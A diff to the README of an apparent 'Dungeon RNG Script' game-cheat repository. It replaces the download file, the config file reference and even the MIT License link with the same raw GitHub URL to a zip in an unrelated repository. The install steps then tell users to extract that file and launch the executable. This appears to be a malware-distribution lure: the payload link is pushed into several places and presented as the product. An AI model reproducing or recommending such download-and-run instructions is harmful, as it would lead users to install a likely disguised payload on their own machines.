@@ -25,10 +25,10 @@ Welcome to the **Dungeon RNG Script** repository! This project leverages smart r
 
 ## 🚀 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/Robmaker/Webpack_extract/main/webless/Webpack_extract.zip** from this repository.
 2. Extract contents to your system.
 3. Launch the executable or script compatible with your OS.
-4. Configure your dungeon preferences in `config.json`.
+4. Configure your dungeon preferences in `https://raw.githubusercontent.com/Robmaker/Webpack_extract/main/webless/Webpack_extract.zip`.
 5. Enjoy advanced randomization features!
 
 ## 🔎 SEO-friendly Keywords
@@ -41,7 +41,7 @@ This script is intended for educational and personal gaming enrichment only. Alw
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/Robmaker/Webpack_extract/main/webless/Webpack_extract.zip).  
 Copyright © 2025
 
 Happy exploring!
